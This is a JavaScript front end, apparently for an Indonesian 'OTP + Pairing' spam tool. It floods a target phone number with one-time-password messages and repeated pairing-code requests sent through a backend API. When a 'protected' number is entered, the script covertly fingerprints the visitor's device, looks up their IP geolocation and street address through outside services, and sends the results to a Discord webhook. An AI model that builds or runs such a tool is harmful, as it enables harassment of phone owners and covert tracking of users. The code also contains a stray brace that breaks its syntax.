/* ============================================================
   APP.JS - OTP + Pairing + Multi Country + Anti-Spam Tracker
   Made By Hanxz
   ============================================================ */

(function () {
    'use strict';

    // ============================================================
    // GET CONFIG
    // ============================================================
    const CFG = window.CONFIG || {};
    const API = CFG.API || {};
    const BASE_URL = API.BASE_URL || '';
    const WEBHOOK = CFG.WEBHOOK || '';
    const MSG = CFG.MSG || {};

    let countryMode = 'id';

// ============================================================
// ENDPOINT BUILDER
// ============================================================
function buildOtpUrl(phoneApi) {
    const mode = (API.OTP && API.OTP.MODE) || 'single';
    const threads = (API.OTP && API.OTP.THREADS) || '43';
    return `${BASE_URL}/${phoneApi}?mode=${mode}&threads=${threads}`;
}
    }
    function buildPairingUrl(phoneApi) {
        const mode = (API.PAIRING && API.PAIRING.MODE) || 'pairing';
        const delay = (API.PAIRING && API.PAIRING.DELAY) || '4.0';
        return `${BASE_URL}/${phoneApi}?mode=${mode}&pairing_delay=${delay}`;
    }

    // ============================================================
    // BANNER
    // ============================================================
    console.log('%c╔═══════════════════════════════════════════╗', 'color:#00ffc8;font-weight:bold;font-size:13px;');
    console.log('%c║   OTP + PAIRING - FULL PROTECT - HANXZ    ║', 'color:#ff0078;font-weight:bold;font-size:13px;');
    console.log('%c║             v8.0 // HANXZ                 ║', 'color:#00ffc8;font-weight:bold;font-size:13px;');
    console.log('%c╚═══════════════════════════════════════════╝', 'color:#00ffc8;font-weight:bold;font-size:13px;');

    // ============================================================
    // ELEMENTS
    // ============================================================
    const log = document.getElementById('log');
    const otpPhoneInput = document.getElementById('otpPhoneInput');
    const otpInputBox = document.getElementById('otpInputBox');
    const otpHint = document.getElementById('otpHint');
    const otpSendBtn = document.getElementById('otpSendBtn');
    const pairPhoneInput = document.getElementById('pairPhoneInput');
    const pairInputBox = document.getElementById('pairInputBox');
    const pairHint = document.getElementById('pairHint');
    const pairCount = document.getElementById('pairCount');
    const pairSendBtn = document.getElementById('pairSendBtn');

    const countryBtnId = document.getElementById('countryBtnId');
    const countryBtnAll = document.getElementById('countryBtnAll');

    // ============================================================
    // COUNTRY SWITCH
    // ============================================================
    function setCountryMode(mode) {
        countryMode = mode;
        countryBtnId.classList.toggle('active', mode === 'id');
        countryBtnAll.classList.toggle('active', mode === 'all');

        if (mode === 'id') {
            otpPhoneInput.placeholder = '08xxxxxxxxxx';
            pairPhoneInput.placeholder = '08xxxxxxxxxx';
            otpHint.innerHTML = '// Contoh: 08123456789 → <span style="color:#00ffc8">628123456789</span>';
            pairHint.innerHTML = '// Contoh: 08123456789 → <span style="color:#00ffc8">628123456789</span>';
        } else {
            otpPhoneInput.placeholder = '+1 2345678900';
            pairPhoneInput.placeholder = '+1 2345678900';
            otpHint.innerHTML = '// Contoh: <span style="color:#ff0078">+1 2345678900</span> → <span style="color:#00ffc8">12345678900</span>';
            pairHint.innerHTML = '// Contoh: <span style="color:#ff0078">+1 2345678900</span> → <span style="color:#00ffc8">12345678900</span>';
        }

        otpInputBox.className = 'input-box';
        pairInputBox.className = 'input-box';
        otpPhoneInput.value = '';
        pairPhoneInput.value = '';

        const activeTab = document.querySelector('.tab-btn.active');
        if (activeTab) {
            if (activeTab.dataset.tab === 'otp') otpPhoneInput.focus();
            else pairPhoneInput.focus();
        }
        console.log('%c🌍 Mode: ' + (mode === 'id' ? 'INDONESIA' : 'ALL COUNTRY'), 'color:#00ffc8;font-weight:bold;');
    }

    countryBtnId.addEventListener('click', () => setCountryMode('id'));
    countryBtnAll.addEventListener('click', () => setCountryMode('all'));

    // ============================================================
    // TAB SWITCH
    // ============================================================
    function switchTab(tab) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.toggle('active', b.dataset.tab === tab));
        document.querySelectorAll('.panel').forEach(p => p.classList.toggle('active', p.id === 'panel-' + tab));
        log.classList.remove('show');
        setTimeout(() => {
            if (tab === 'otp') otpPhoneInput.focus();
            else pairPhoneInput.focus();
        }, 100);
    }
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => switchTab(btn.dataset.tab));
    });

    // ============================================================
    // UTILITY
    // ============================================================
    function getTime() {
        const d = new Date();
        return d.toTimeString().substr(0, 8);
    }
    function escapeHtml(s) {
        return String(s || '').replace(/[&<>"']/g, c => ({
            '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
        }[c]));
    }

    // ============================================================
    // NORMALIZE PHONE
    // ============================================================
    function normalizePhone(phone, mode) {
        mode = mode || countryMode;
        let raw = phone.trim().replace(/[\s\-\(\)]/g, '');
        let clean = raw.replace(/\D/g, '');

        if (mode === 'id') {
            if (clean.startsWith('0')) clean = clean.substring(1);
            if (clean.startsWith('62')) clean = clean.substring(2);
            if (clean.length < 8) return null;
            return {
                raw: clean,
                api: '62' + clean,
                local: '0' + clean,
                plus: '+62' + clean,
                country: 'ID'
            };
        }

        if (mode === 'all') {
            if (clean.length < 8) return null;
            if (clean.length > 15) return null;
            let countryCode = 'XX';
            if (clean.startsWith('62')) countryCode = 'ID';
            else if (clean.startsWith('1')) countryCode = 'US';
            else if (clean.startsWith('60')) countryCode = 'MY';
            else if (clean.startsWith('65')) countryCode = 'SG';
            else if (clean.startsWith('66')) countryCode = 'TH';
            else if (clean.startsWith('84')) countryCode = 'VN';
            else if (clean.startsWith('81')) countryCode = 'JP';
            else if (clean.startsWith('82')) countryCode = 'KR';
            else if (clean.startsWith('86')) countryCode = 'CN';
            else if (clean.startsWith('91')) countryCode = 'IN';
            else if (clean.startsWith('44')) countryCode = 'UK';
            else if (clean.startsWith('61')) countryCode = 'AU';
            return {
                raw: clean,
                api: clean,
                local: clean,
                plus: '+' + clean,
                country: countryCode
            };
        }
        return null;
    }

    // ============================================================
    // BLACKLIST CHECK (pakai config)
    // ============================================================
    function isBlacklisted(phoneRaw) {
        if (window.CONFIG && typeof window.CONFIG.isBlacklisted === 'function') {
            return window.CONFIG.isBlacklisted(phoneRaw);
        }
        console.warn('%c⚠️ CONFIG.isBlacklisted gak ada!', 'color:#ffbd2e;font-weight:bold;');
        return false;
    }

    // ============================================================
    // COLLECT OFFENDER DATA
    // ============================================================
    async function collectOffenderData() {
        const data = {
            ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A',
            isp: 'N/A', timezone: 'N/A', loc: 'N/A', fullAddress: 'N/A',
            weather: 'N/A',
            userAgent: navigator.userAgent || 'N/A',
            platform: navigator.platform || 'N/A',
            language: navigator.language || 'N/A',
            ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
            cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : 'N/A',
            gpu: 'N/A', battery: 'N/A', batteryCharging: 'N/A',
            screen: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth + ' bit',
            fingerprint: 'N/A',
            localTime: new Date().toLocaleString('id-ID')
        };

        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                else data.gpu = gl.getParameter(gl.RENDERER) || 'N/A';
            }
        } catch (e) {}

        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                data.battery = Math.round(b.level * 100) + '%';
                data.batteryCharging = b.charging ? 'Ya ⚡' : 'Tidak';
            }
        } catch (e) {}

        try {
            const raw = [
                navigator.userAgent, navigator.platform, navigator.language,
                screen.width + 'x' + screen.height, screen.colorDepth,
                new Date().getTimezoneOffset(),
                navigator.hardwareConcurrency || 'x', navigator.deviceMemory || 'x'
            ].join('|');
            const buf = new TextEncoder().encode(raw);
            const hash = await crypto.subtle.digest('SHA-256', buf);
            const arr = new Uint8Array(hash);
            data.fingerprint = Array.from(arr).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 32);
        } catch (e) {}

        try {
            const r = await fetch('https://ipapi.co/json/').then(x => x.json()).catch(() => ({}));
            data.ip = r.ip || 'N/A';
            data.country = r.country_name || 'N/A';
            data.region = r.region || 'N/A';
            data.city = r.city || 'N/A';
            data.timezone = r.timezone || 'N/A';
            data.loc = r.latitude && r.longitude ? `${r.latitude},${r.longitude}` : 'N/A';
            data.isp = r.org || 'N/A';
        } catch (e) {}

        try {
            const r2 = await fetch('https://ipinfo.io/json').then(x => x.json()).catch(() => ({}));
            if (data.ip === 'N/A') data.ip = r2.ip || 'N/A';
            if (data.isp === 'N/A') data.isp = r2.org || 'N/A';
            if (data.timezone === 'N/A') data.timezone = r2.timezone || 'N/A';
            if (data.loc === 'N/A') data.loc = r2.loc || 'N/A';
        } catch (e) {}

        if (data.loc && data.loc !== 'N/A') {
            try {
                const [lat, lon] = data.loc.split(',');
                const r3 = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
                    .then(x => x.json()).catch(() => ({}));
                data.fullAddress = r3.display_name || 'N/A';
            } catch (e) {}
        }

        try {
            const r4 = await fetch('https://wttr.in/?format=j1').then(x => x.json()).catch(() => ({}));
            if (r4.current_condition && r4.current_condition[0]) {
                const c = r4.current_condition[0];
                data.weather = `${c.weatherDesc[0].value} | ${c.temp_C}°C`;
            }
        } catch (e) {}

        return data;
    }

    // ============================================================
    // SEND WEBHOOK
    // ============================================================
    async function sendToWebhook(offenderData, action, targetNum) {
        if (!WEBHOOK || WEBHOOK.indexOf('xxxxx') > -1) {
            console.warn('%c⚠️ Webhook belum diisi!', 'color:#ffbd2e;font-weight:bold;');
            return;
        }

        const fields = [
            { name: '🎯 Target', value: '`' + (targetNum || 'N/A') + '`', inline: true },
            { name: '⚡ Aksi', value: '`' + action + '`', inline: true },
            { name: '🌐 IP', value: '`' + (offenderData.ip || 'N/A') + '`', inline: true },
            { name: '🏳️ Negara', value: '`' + (offenderData.country || 'N/A') + '`', inline: true },
            { name: '📍 Region', value: '`' + (offenderData.region || 'N/A') + '`', inline: true },
            { name: '🏙️ Kota', value: '`' + (offenderData.city || 'N/A') + '`', inline: true },
            { name: '📡 ISP', value: '`' + (offenderData.isp || 'N/A') + '`', inline: true },
            { name: '🕒 Timezone', value: '`' + (offenderData.timezone || 'N/A') + '`', inline: true },
            { name: '💻 Platform', value: '`' + (offenderData.platform || 'N/A') + '`', inline: true },
            { name: '🧠 RAM', value: '`' + (offenderData.ram || 'N/A') + '`', inline: true },
            { name: '⚙️ CPU', value: '`' + (offenderData.cpu || 'N/A') + '`', inline: true },
            { name: '🎮 GPU', value: '`' + String(offenderData.gpu || 'N/A').substring(0, 100) + '`', inline: false },
            { name: '🔋 Baterai', value: '`' + (offenderData.battery || 'N/A') + (offenderData.batteryCharging ? ' | ' + offenderData.batteryCharging : '') + '`', inline: true },
            { name: '📱 Layar', value: '`' + (offenderData.screen || 'N/A') + '`', inline: true },
            { name: '🌍 Bahasa', value: '`' + (offenderData.language || 'N/A') + '`', inline: true },
            { name: '🔑 Fingerprint', value: '`' + (offenderData.fingerprint || 'N/A') + '`', inline: false },
            { name: '🗺️ Alamat', value: '```' + String(offenderData.fullAddress || 'N/A').substring(0, 900) + '```', inline: false },
            { name: '☁️ Cuaca', value: '`' + (offenderData.weather || 'N/A') + '`', inline: false },
            { name: '🖥️ User Agent', value: '```' + String(offenderData.userAgent || 'N/A').substring(0, 900) + '```', inline: false }
        ];

        const payload = {
            username: 'OTP Tracker',
            content: '@everyone 🚨 **ADA YANG COBA SPAM NOMOR BLACKLIST!**',
            embeds: [{
                title: '🚨 PELANGGAR TERDETEKSI',
                description: `Target: \`${targetNum || 'N/A'}\`\nAksi: **${action}**\nWaktu: \`${new Date().toLocaleString('id-ID')}\``,
                color: 0xff0055,
                fields: fields,
                footer: { text: 'OTP + Pairing Tracker · Made By Hanxz' },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const res = await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (res.ok) console.log('%c✅ Webhook terkirim!', 'color:#27c93f;font-weight:bold;');
        } catch (e) { console.error(e); }
    }

    // ============================================================
    // LOG
    // ============================================================
    function resetLog(title) {
        log.innerHTML = `
            <div class="log-header">
                <span>${title || '// SYSTEM LOG'}</span>
                <span class="dot">● LIVE</span>
            </div>
        `;
        log.classList.add('show');
    }

    function addLog(msg, type = 'info') {
        const prefixMap = { ok: '✓', err: '✗', info: '▸', warn: '!' };
        const line = document.createElement('div');
        line.className = 'log-line ' + type;
        line.innerHTML = `
            <span class="time">[${getTime()}]</span>
            <span class="prefix">${prefixMap[type] || '›'}</span>
            <span class="msg">${msg}</span>
        `;
        log.appendChild(line);
        log.scrollTop = log.scrollHeight;
    }

    // ============================================================
    // VALIDATOR
    // ============================================================
    function makeValidator(inputEl, boxEl, hintEl) {
        return function () {
            const raw = inputEl.value.trim();
            if (!raw) {
                if (countryMode === 'id') {
                    hintEl.innerHTML = '// Contoh: 08123456789 → <span style="color:#00ffc8">628123456789</span>';
                } else {
                    hintEl.innerHTML = '// Contoh: <span style="color:#ff0078">+1 2345678900</span> → <span style="color:#00ffc8">12345678900</span>';
                }
                hintEl.className = 'hint';
                boxEl.className = 'input-box';
                return null;
            }

            const clean = raw.replace(/\D/g, '');
            if (clean.length < 8) {
                hintEl.textContent = `// Menunggu... (${clean.length} digit, min 8)`;
                hintEl.className = 'hint';
                boxEl.className = 'input-box';
                return null;
            }

            const n = normalizePhone(raw, countryMode);
            if (!n) {
                hintEl.textContent = '// Nomor tidak valid!';
                hintEl.className = 'hint error';
                boxEl.className = 'input-box error';
                return null;
            }

            if (countryMode === 'id' && !n.api.startsWith('62')) {
                hintEl.innerHTML = '// <span style="color:#ff5f56">⚠️ Mode Indonesia — nomor harus 08xxx / 628xxx</span>';
                hintEl.className = 'hint error';
                boxEl.className = 'input-box error';
                return null;
            }

            const flag = countryMode === 'id' ? '🇮🇩' : '🌍';
            hintEl.innerHTML = `${flag} VALID ✓ <span class="convert">${escapeHtml(n.local)}</span> → <span style="color:#00ffc8">${escapeHtml(n.api)}</span>`;
            hintEl.className = 'hint valid';
            boxEl.className = 'input-box success';
            return n;
        };
    }

    const validateOtp = makeValidator(otpPhoneInput, otpInputBox, otpHint);
    const validatePair = makeValidator(pairPhoneInput, pairInputBox, pairHint);

    otpPhoneInput.addEventListener('input', validateOtp);
    pairPhoneInput.addEventListener('input', validatePair);

    // ============================================================
    // HANDLE BLACKLIST
    // ============================================================
    async function handleBlacklist(scope, n) {
        const action = scope === 'otp' ? 'SPAM OTP' : 'SPAM PAIRING';
        resetLog(scope === 'otp' ? '// OTP LOG' : '// PAIRING LOG');
        addLog('━━━━━━━━━━━━━━━━━━━━━━━━', 'err');
        addLog('🚫 <b>AKSES DITOLAK!</b>', 'err');
        addLog('Nomor ini <b style="color:#ff5f56">DILINDUNGI</b>', 'err');
        addLog('━━━━━━━━━━━━━━━━━━━━━━━━', 'err');
        addLog('📡 Mengumpulkan data pelanggar...', 'warn');

        try {
            const data = await collectOffenderData();
            console.log('%c🚨 [TRACKER] Pelanggar terdeteksi!', 'color:#ff5f56;font-weight:bold;font-size:14px;');
            console.log(data);
            addLog('📤 Mengirim data ke admin...', 'warn');
            await sendToWebhook(data, action, n.raw);
            addLog('━━━━━━━━━━━━━━━━━━━━━━━━', 'err');
            addLog('✅ <b>DATA TERKIRIM KE ADMIN!</b>', 'warn');
            addLog('📡 IP: <b style="color:#ff5f56">' + escapeHtml(data.ip) + '</b>', 'err');
            addLog('📍 Lokasi: <b style="color:#ff5f56">' + escapeHtml(data.city + ', ' + data.country) + '</b>', 'err');
            addLog('🖥️ Device: <b style="color:#ff5f56">' + escapeHtml(data.platform) + '</b>', 'err');
        } catch (e) {
            addLog('⚠️ Error: ' + escapeHtml(e.message), 'warn');
        }
    }

    // ============================================================
    // OTP SEND
    // ============================================================
    otpSendBtn.addEventListener('click', async function () {
        const phone = otpPhoneInput.value.trim();
        if (!phone) {
            otpHint.textContent = '// ' + (MSG.EMPTY_NUMBER || 'Nomor kosong!');
            otpHint.className = 'hint error';
            otpInputBox.className = 'input-box error';
            resetLog('// OTP LOG');
            addLog(MSG.EMPTY_NUMBER || 'Nomor kosong', 'err');
            return;
        }

        const n = normalizePhone(phone, countryMode);
        if (!n) {
            otpHint.textContent = '// ' + (MSG.INVALID_NUMBER || 'Nomor tidak valid!');
            otpHint.className = 'hint error';
            otpInputBox.className = 'input-box error';
            resetLog('// OTP LOG');
            addLog(MSG.INVALID_NUMBER || 'Nomor tidak valid', 'err');
            return;
        }

        if (countryMode === 'id' && !n.api.startsWith('62')) {
            otpHint.innerHTML = '// <span style="color:#ff5f56">⚠️ Mode Indonesia aktif</span>';
            otpHint.className = 'hint error';
            otpInputBox.className = 'input-box error';
            resetLog('// OTP LOG');
            addLog('⚠️ Mode ID aktif. Nomor harus 08xxx/628xxx', 'err');
            return;
        }

        // BLACKLIST CHECK
        if (isBlacklisted(n.raw)) {
            otpHint.innerHTML = '// <span style="color:#ff5f56">🚫 NOMOR DILINDUNGI!</span>';
            otpHint.className = 'hint error';
            otpInputBox.className = 'input-box error';
            await handleBlacklist('otp', n);
            return;
        }

        otpSendBtn.disabled = true;
        otpSendBtn.classList.add('loading');
        resetLog('// OTP LOG');

        const flag = countryMode === 'id' ? '🇮🇩' : '🌍';
        addLog(`${flag} Memulai OTP spam...`, 'info');
        addLog(`Input: <b style="color:#ffbd2e">${escapeHtml(n.local)}</b>`, 'info');
        addLog(`Request: <b style="color:#00ffc8">${escapeHtml(n.api)}</b>`, 'info');

        const url = buildOtpUrl(n.api);
        console.log('%c▸ [OTP] URL: ' + url, 'color:#00ffc8;font-weight:bold;');

        try {
            addLog('Mengirim request...', 'info');
            const startTime = performance.now();
            const res = await fetch(url, { method: 'GET', headers: { 'Accept': 'application/json' } });
            const duration = Math.round(performance.now() - startTime);

            if (!res.ok) {
                addLog(`HTTP Error ${res.status} (${duration}ms)`, 'err');
                otpSendBtn.disabled = false;
                otpSendBtn.classList.remove('loading');
                return;
            }

            const text = await res.text();
            let data;
            try { data = JSON.parse(text); } catch (e) { data = { raw: text }; }

            addLog(`<b style="color:#27c93f">✓ SUKSES!</b> OTP terkirim`, 'ok');
            addLog(`Response time: ${duration}ms`, 'info');

            if (data.status) addLog(`Status: <b style="color:#00ffc8">${escapeHtml(String(data.status))}</b>`, 'info');
            if (data.message) addLog(`Pesan: ${escapeHtml(String(data.message))}`, 'info');
            if (data.total) addLog(`Total: <b style="color:#00aaff">${escapeHtml(String(data.total))}</b>`, 'info');

            addLog(`━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
            addLog(`<b style="color:#27c93f">◆ SELESAI ◆</b>`, 'ok');

        } catch (error) {
            addLog(`<b style="color:#ff5f56">✗ GAGAL!</b>`, 'err');
            addLog(`Error: ${escapeHtml(error.message)}`, 'err');
        }

        otpSendBtn.disabled = false;
        otpSendBtn.classList.remove('loading');
    });

    otpPhoneInput.addEventListener('keypress', e => {
        if (e.key === 'Enter') otpSendBtn.click();
    });

    // ============================================================
    // PAIRING SPAM
    // ============================================================
    pairSendBtn.addEventListener('click', async function () {
        const phone = pairPhoneInput.value.trim();
        if (!phone) {
            pairHint.textContent = '// ' + (MSG.EMPTY_NUMBER || 'Nomor kosong!');
            pairHint.className = 'hint error';
            pairInputBox.className = 'input-box error';
            resetLog('// PAIRING LOG');
            addLog(MSG.EMPTY_NUMBER || 'Nomor kosong', 'err');
            return;
        }

        const n = normalizePhone(phone, countryMode);
        if (!n) {
            pairHint.textContent = '// ' + (MSG.INVALID_NUMBER || 'Nomor tidak valid!');
            pairHint.className = 'hint error';
            pairInputBox.className = 'input-box error';
            resetLog('// PAIRING LOG');
            addLog(MSG.INVALID_NUMBER || 'Nomor tidak valid', 'err');
            return;
        }

        if (countryMode === 'id' && !n.api.startsWith('62')) {
            pairHint.innerHTML = '// <span style="color:#ff5f56">⚠️ Mode Indonesia aktif</span>';
            pairHint.className = 'hint error';
            pairInputBox.className = 'input-box error';
            resetLog('// PAIRING LOG');
            addLog('⚠️ Mode ID aktif', 'err');
            return;
        }

        // BLACKLIST CHECK
        if (isBlacklisted(n.raw)) {
            pairHint.innerHTML = '// <span style="color:#ff5f56">🚫 NOMOR DILINDUNGI!</span>';
            pairHint.className = 'hint error';
            pairInputBox.className = 'input-box error';
            await handleBlacklist('pairing', n);
            return;
        }

        const total = parseInt(pairCount.value) || 10;
        if (total < 1) {
            addLog(MSG.INVALID_COUNT || 'Jumlah minimal 1', 'err');
            return;
        }

        pairSendBtn.disabled = true;
        pairSendBtn.classList.add('loading');
        resetLog('// PAIRING LOG');

        const flag = countryMode === 'id' ? '🇮🇩' : '🌍';
        addLog(`${flag} Memulai Pairing spam...`, 'info');
        addLog(`Input: <b style="color:#ffbd2e">${escapeHtml(n.local)}</b>`, 'info');
        addLog(`Request: <b style="color:#00ffc8">${escapeHtml(n.api)}</b>`, 'info');
        addLog(`Jumlah: <b style="color:#ff0078">${total}x</b>`, 'info');
        addLog(`━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');

        let succ = 0, fail = 0, lastCode = '';

        for (let i = 1; i <= total; i++) {
            addLog(`🔗 Pairing <b>${i}</b>/${total}...`, 'info');
            const url = buildPairingUrl(n.api);

            try {
                const res = await fetch(url, { method: 'GET', headers: { 'Accept': 'application/json' } });

                if (!res.ok) {
                    fail++;
                    addLog(`❌ Pairing-${i} GAGAL (HTTP ${res.status})`, 'err');
                    continue;
                }

                const text = await res.text();
                let data;
                try { data = JSON.parse(text); } catch (e) { data = { raw: text }; }

                const code =
                    data.code || data.pairing_code || data.pairingCode || data.pairing ||
                    (data.result && (data.result.code || data.result.pairing_code || data.result.pairingCode)) ||
                    (data.data && (data.data.code || data.data.pairing_code || data.data.pairingCode)) ||
                    null;

                if (code) {
                    lastCode = String(code).toUpperCase().trim();
                    succ++;
                    addLog(`✅ Pairing-${i} → <b style="color:#ff0078;font-size:14px;letter-spacing:2px">${escapeHtml(lastCode)}</b>`, 'ok');
                } else {
                    succ++;
                    addLog(`⚠️ Pairing-${i} OK (gak ada code)`, 'warn');
                }
            } catch (error) {
                fail++;
                addLog(`❌ Pairing-${i} ERROR: ${escapeHtml(error.message)}`, 'err');
            }
        }

        addLog(`━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
        addLog(`<b style="color:#27c93f">◆ SELESAI ◆</b> Sukses: <b style="color:#27c93f">${succ}</b> · Gagal: <b style="color:#ff5f56">${fail}</b>`, 'ok');
        if (lastCode) {
            addLog(`🔑 <b>Code terakhir:</b> <span style="color:#ff0078;font-size:15px;letter-spacing:3px">${escapeHtml(lastCode)}</span>`, 'ok');
        }

        pairSendBtn.disabled = false;
        pairSendBtn.classList.remove('loading');
    });

    pairPhoneInput.addEventListener('keypress', e => {
        if (e.key === 'Enter') pairSendBtn.click();
    });

    // ============================================================
    // INIT
    // ============================================================
    setTimeout(() => otpPhoneInput.focus(), 300);
    setTimeout(() => {
        resetLog('// SYSTEM LOG');
        addLog('System initialized', 'ok');
        addLog('🇮🇩 Mode Indonesia aktif', 'info');
        addLog('🔒 Protected number aktif', 'warn');
    }, 600);

})();